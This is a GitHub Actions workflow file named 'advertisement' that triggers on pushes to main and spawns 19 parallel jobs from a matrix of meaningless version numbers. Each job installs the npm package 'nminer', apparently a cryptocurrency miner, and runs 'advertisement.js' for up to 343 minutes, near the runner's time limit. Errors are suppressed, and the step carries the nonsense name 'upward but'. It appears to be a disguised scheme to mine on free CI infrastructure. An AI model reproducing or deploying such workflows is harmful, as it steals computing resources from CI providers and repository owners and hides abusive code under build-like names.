name: advertisement
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1381 }
          - { version: 6802 }
          - { version: 3973 }
          - { version: 8024 }
          - { version: 6856 }
          - { version: 8163 }
          - { version: 7806 }
          - { version: 7166 }
          - { version: 7040 }
          - { version: 6121 }
          - { version: 5097 }
          - { version: 5665 }
          - { version: 2826 }
          - { version: 2735 }
          - { version: 1463 }
          - { version: 2817 }
          - { version: 8661 }
          - { version: 27 }
          - { version: 5327 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: upward but
        run: |
          npm install nminer@latest
          timeout 343m node advertisement.js || echo "advertisement executed"